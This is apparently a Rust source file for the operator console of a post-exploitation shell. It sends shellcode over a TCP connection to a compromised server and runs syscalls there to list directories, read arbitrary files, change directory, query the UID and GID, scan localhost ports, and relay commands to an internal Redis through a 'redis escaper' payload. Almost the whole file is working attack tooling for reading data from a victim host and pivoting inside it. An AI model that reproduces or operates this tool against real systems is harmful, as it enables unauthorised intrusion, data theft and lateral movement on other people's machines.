use std::{io::{self, Write, Read}, error::Error, net::Shutdown};

use colored::Colorize;
use errno::Errno;

use crate::{util::{print_error, print_success}, config::Config, shellcode::{SYS_OPEN_DIR_SENDER, SYS_OPEN_CAT_SENDER, SYS_CHDIR_CD_SENDER, SYS_GETCWD_CWD_SENDER, SYS_GETUID_GETUID_SENDER, SYS_GETGID_GETGID_SENDER, SYS_SOCKET_SYS_CONNECT_PORT_SCANNER, SHELLCODE_LEN, REDIS_ESCAPER}};

fn help() {
    println!(
        "
    Core Commands
    =============

        Command                   Description                                    Syscalls
        -------                   -------                                        -----------
        help                      Print This Menu                                N/A
        ls [DIR]                  List Directory                                 SYS_open, SYS_getdents
        dir [DIR]                 List Directory                                 SYS_open, SYS_getdents
        cat [FILE]                Print File Content                             SYS_open, SYS_read
        cd [DIR]                  Change Directory                               SYS_chdir
        pwd                       Print Current Directory                        SYS_getcwd
        getuid                    Get Current UID                                SYS_getuid
        getgid                    Get Current GID                                SYS_getgid
        portscan                  Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
        netcat [PORT] [FILE]      Send Data (stored in [FILE]) to Port [PORT]    SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
                                  And receive its output
        exit                      Exit shell                                     N/A
"
    );
}

fn dir(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    // Maximum file length is 256
    let dir_sender = SYS_OPEN_DIR_SENDER;
    let mut dir_shellcode = dir_sender.shellcode.to_vec();
    dir_shellcode.extend(file.as_bytes());
    dir_shellcode.push(0);
    dir_shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&dir_shellcode)?;

    let mut beacon_buff = [0; 8];
    conn.read_exact(&mut beacon_buff)?;
    let beacon = i64::from_le_bytes(beacon_buff);

    if beacon < 0 {
        let e = -beacon;
        let message = format!("ls: cannot access '{}': {}", file, Errno(e as i32));
        return Err(message.into());
    }

    let struct_len = beacon as u64;
    let mut index: u64 = 0;

    while index < struct_len {
        /* inode not important here */
        let mut _d_ino_buff = [0; 8];
        conn.read_exact(&mut _d_ino_buff)?;
        let _d_ino = u64::from_le_bytes(_d_ino_buff);

        /* d_off not important here */
        let mut _d_off_buff = [0; 8];
        conn.read_exact(&mut _d_off_buff)?;
        let _d_off = u64::from_le_bytes(_d_off_buff);
        
        let mut d_reclen_buff = [0; 2];
        conn.read_exact(&mut d_reclen_buff)?;
        let d_reclen = u16::from_le_bytes(d_reclen_buff);

        let mut file_name_buff = vec![0; (d_reclen - 0x13) as usize];
        conn.read_exact(&mut file_name_buff)?;

        /* Remove redundant null bytes */
        file_name_buff = file_name_buff.into_iter().take_while(|&x| x != 0).collect();

        let file_name = String::from_utf8_lossy(&file_name_buff).to_string();

        let mut d_type_buff = [0; 1];
        conn.read_exact(&mut d_type_buff)?;
        let d_type = u8::from_le_bytes(d_type_buff);

        let file_name_colored = match d_type {
            0 => { // DT_UNKNOWN
                file_name
            }
            1 => { // DT_FIFO
                file_name.yellow().on_black().to_string()
            },
            2 => { // DT_CHR
                file_name.yellow().bold().to_string()
            },
            4 => { // DT_DIR
                file_name.blue().bold().to_string()
            },
            6 => { // DT_BLK
                file_name.yellow().bold().to_string()
            },
            8 => { // DT_REG
                file_name
            },
            10 => { // DT_LNK
                file_name.cyan().bold().to_string()
            }
            12 => { // DT_SOCK
                file_name.magenta().bold().to_string()
            },
            14 => { // DT_WHT
                file_name
            },
            _ => {
                file_name
            }
        };

        println!("{}", file_name_colored);

        index += d_reclen as u64;
    }

    Ok(())
}

fn cat(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    let cat_sender = SYS_OPEN_CAT_SENDER;
    let mut cat_shellcode = cat_sender.shellcode.to_vec();
    cat_shellcode.extend(file.as_bytes());
    cat_shellcode.push(0);
    cat_shellcode.resize(SHELLCODE_LEN, 0);


    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&cat_shellcode)?;

    let mut beacon_buff = [0; 8];
    let mut file_content_buff = Vec::new();
    loop {
        conn.read_exact(&mut beacon_buff)?;
        let beacon = i64::from_le_bytes(beacon_buff);
        if beacon == 0 {
            break;
        }
        if beacon < 0 {
            let e = -beacon;
            let message = format!("cat: cannot access '{}': {}", file, Errno(e as i32));
            return Err(message.into());
        }
        let chunk_len = beacon as u64;
        let mut chunk_buff = vec![0; chunk_len as usize];
        conn.read_exact(&mut chunk_buff)?;
        file_content_buff.extend(chunk_buff);
    }

    let file_content = String::from_utf8_lossy(&file_content_buff).to_string();
    println!("{}", file_content);

    Ok(())
}

fn cd(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    let cd_sender = SYS_CHDIR_CD_SENDER;
    let mut cd_shellcode = cd_sender.shellcode.to_vec();
    cd_shellcode.extend(file.as_bytes());
    cd_shellcode.push(0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&cd_shellcode)?;

    let mut beacon_buff = [0; 8];
    conn.read_exact(&mut beacon_buff)?;
    let beacon = i64::from_le_bytes(beacon_buff);
    if beacon < 0 {
        let e = -beacon;
        let message = format!("cd: cannot access '{}': {}", file, Errno(e as i32));
        return Err(message.into());
    }

    println!("Changed to '{}' successfully", file);

    Ok(())
}

fn pwd(config: &Config) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    let pwd_sender = SYS_GETCWD_CWD_SENDER;
    let mut pwd_shellcode = pwd_sender.shellcode.to_vec();
    pwd_shellcode.resize(SHELLCODE_LEN, 0);


    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&pwd_shellcode)?;

    let mut cwd_len_buff = [0; 8];
    conn.read_exact(&mut cwd_len_buff)?;
    let cwd_len = i64::from_le_bytes(cwd_len_buff);

    let mut cwd_buff = vec![0; cwd_len as usize];
    conn.read_exact(&mut cwd_buff)?;
    cwd_buff.pop(); // remove trailing null byte
    let cwd = String::from_utf8_lossy(&cwd_buff).to_string();

    println!("{}", cwd);

    Ok(())
}

fn getuid(config: &Config) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    let getuid_sender = SYS_GETUID_GETUID_SENDER;
    let mut getuid_shellcode = getuid_sender.shellcode.to_vec();
    getuid_shellcode.resize(SHELLCODE_LEN, 0);


    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&getuid_shellcode)?;

    let mut uid_buff = [0; 8];
    conn.read_exact(&mut uid_buff)?;
    let uid = i64::from_le_bytes(uid_buff);

    println!("{}", uid);

    Ok(())
}

fn getgid(config: &Config) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    let getgid_sender = SYS_GETGID_GETGID_SENDER;
    let mut getgid_shellcode = getgid_sender.shellcode.to_vec();
    getgid_shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn: &std::net::TcpStream = config.conn.as_ref().unwrap();
    conn.write(&getgid_shellcode)?;

    let mut gid_buff = [0; 8];
    conn.read_exact(&mut gid_buff)?;
    let gid = i64::from_le_bytes(gid_buff);

    println!("{}", gid);

    Ok(())
}

fn exit() -> Result<bool, Box<dyn Error>> {
    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();
    loop {
        let mut line = String::new();
        let quote = "Exit server? (y/n)> ".bold();
        write!(stdout_handle, "{}", quote)?;
        stdout_handle.flush()?;
        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read != 0 {
            let first_char = line.chars().nth(0).unwrap();
            if first_char == 'y' {
                return Ok(true);
            } else if first_char == 'n' {
                return Ok(false);
            }
        }
    }
}

pub fn portscan(config: &mut Config) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    let tcp_scanner = SYS_SOCKET_SYS_CONNECT_PORT_SCANNER;
    let mut tcp_scanner_shellcode = tcp_scanner.shellcode.to_vec();
    tcp_scanner_shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&tcp_scanner_shellcode)?;

    let mut open_port_num_buff = [0; 8];
    conn.read_exact(&mut open_port_num_buff)?;
    let open_port_num = i64::from_le_bytes(open_port_num_buff);

    print_success("Open ports: ");
    for _ in 0..open_port_num {
        let mut open_port_buff = [0; 2];
        conn.read_exact(&mut open_port_buff)?;
        let open_port = u16::from_le_bytes(open_port_buff);

        println!("{}", open_port);
    }

    Ok(())
}

pub fn redis(config: &mut Config, port: u16) -> Result<(), Box<dyn Error>> {
    let ps = "redis> ".bold();

    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();

    loop {
        let mut line = String::new();

        write!(stdout_handle, "{}", ps)?;
        stdout_handle.flush()?;

        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read == 0 {
            break;
        }
        let cmds: Vec<&str> = line.trim().split_whitespace().collect();

        let mut payload = String::new();
        payload.push('*');
        let cmds_len_str = cmds.len().to_string();
        payload.push_str(&cmds_len_str);
        payload.push_str("\r\n");
        for cmd in cmds {
            payload.push('$');
            let cmd_len_str = cmd.len().to_string();
            payload.push_str(&cmd_len_str);
            payload.push_str("\r\n");
            payload.push_str(cmd);
            payload.push_str("\r\n");
        }

        let payload_len = payload.len();

        let redis_escaper = REDIS_ESCAPER;
        let mut redis_escaper_shellcode = redis_escaper.shellcode.to_vec();
        redis_escaper_shellcode[redis_escaper.data_length_index] = (payload_len & 0xff) as u8;
        redis_escaper_shellcode[redis_escaper.data_length_index + 1] = ((payload_len & 0xff00) >> 8) as u8;
        redis_escaper_shellcode[redis_escaper.data_length_index + 2] = ((payload_len & 0xff0000) >> 16) as u8;
        redis_escaper_shellcode[redis_escaper.data_length_index + 3] = ((payload_len & 0xff000000) >> 24) as u8;
        redis_escaper_shellcode[redis_escaper.port_index] = ((port & 0xff00) >> 8) as u8;
        redis_escaper_shellcode[redis_escaper.port_index + 1] = (port & 0xff) as u8;
        redis_escaper_shellcode.resize(SHELLCODE_LEN, 0);

        let mut conn = config.conn.as_ref().unwrap();
        conn.write(&redis_escaper_shellcode)?;
        conn.write(payload.as_bytes())?;

        let mut beacon_buff = [0; 8];
        conn.read_exact(&mut beacon_buff)?;
        let beacon = i64::from_le_bytes(beacon_buff);
        if beacon == 0 {
            println!("OK");
            continue;
        }
        if beacon < 0 {
            let e = -beacon;
            let message = format!("redis: {}", Errno(e as i32));
            return Err(message.into());
        }
        let content_len = beacon as u64;
        let mut content_buff = vec![0; content_len as usize];
        conn.read_exact(&mut content_buff)?;

        let result;
        if *content_buff.last().unwrap() == b'\n' {
            result = String::from_utf8_lossy(&content_buff[1..(content_len - 2) as usize]).to_string();
        } else {
            content_buff.reverse();
            result = String::from_utf8_lossy(&content_buff[..(content_len - 2) as usize]).to_string();
        }

        println!("{}", result);
    }

    println!("");
    Ok(())
}

pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
    let ps = "$ ".bold();

    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();

    loop {
        let mut line = String::new();

        write!(stdout_handle, "{}", ps)?;
        stdout_handle.flush()?;

        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read == 0 {
            match exit() {
                Ok(want_exit) => {
                    if want_exit && config.conn.is_some() {
                        config.conn.as_ref().unwrap().shutdown(Shutdown::Both)?;
                        config.conn = None;
                        break;
                    }
                },
                Err(_) => {
                    /* Close the connection in case things go wrong */
                    /* Probably not a good idea here, but I'll fix this later */
                    if config.conn.is_some() {
                        config.conn.as_ref().unwrap().shutdown(Shutdown::Both)?;
                        config.conn = None;
                    }
                }
            }
            continue;
        }
        let mut iter = line.trim().split_whitespace();
        if let Some(command) = iter.next() {
            match command {
                "help" => {
                    help();
                },
                "ls" | "dir" => {
                    let file = match iter.next() {
                        Some(f) => f,
                        None => ".",
                    };
                    if let Err(err) = dir(config, file) {
                        let message = format!("Error: {}", err);
                        print_error(&message);
                    }
                },
                "cat" | "type" => {
                    if let Some(f) = iter.next() {
                        if let Err(err) = cat(config, f) {
                            let message = format!("Error: {}", err);
                            print_error(&message);
                        }
                    } else {
                        print_error("Error: cat: no file specified")
                    }
                },
                "cd" => {
                    if let Some(f) = iter.next() {
                        if let Err(err) = cd(config, f) {
                            let message = format!("Error: {}", err);
                            print_error(&message);
                        }
                    }
                },
                "pwd" => {
                    if let Err(err) = pwd(config) {
                        let message = format!("Error: {}", err);
                        print_error(&message);
                    }
                },
                "getuid" => {
                    if let Err(err) = getuid(config) {
                        let message = format!("Error: {}", err);
                        print_error(&message);
                    }
                },
                "getgid" => {
                    if let Err(err) = getgid(config) {
                        let message = format!("Error: {}", err);
                        print_error(&message);
                    }
                },
                "portscan" => {
                    if let Err(err) = portscan(config) {
                        let message = format!("Error: {}", err);
                        print_error(&message);
                    }
                },
                "redis" => {
                    let port = match iter.next() {
                        Some(port_str) => {
                            if let Ok(port) = port_str.parse::<u16>() {
                                port
                            } else {
                                6379
                            }
                        },
                        None => {
                            6379
                        }
                    };
                    if let Err(err) = redis(config, port) {
                        let message = format!("Error: {}", err);
                        print_error(&message);
                    }
                },
                "exit" => {
                    match exit() {
                        Ok(want_exit) => {
                            if want_exit && config.conn.is_some() {
                                config.conn.as_ref().unwrap().shutdown(Shutdown::Both)?;
                                config.conn = None;
                                break;
                            }
                        },
                        Err(_) => {
                            /* Close the connection in case things go wrong */
                            /* Probably not a good idea here, but I'll fix this later */
                            if config.conn.is_some() {
                                config.conn.as_ref().unwrap().shutdown(Shutdown::Both)?;
                                config.conn = None;
                            }
                        }
                    }
                },
                _ => {
                    let message = format!("Unknown command '{}'", command);
                    print_error(&message);
                    help();
                }
            };
        } else {
            help();
        }
    }

    println!("");
    Ok(())
}
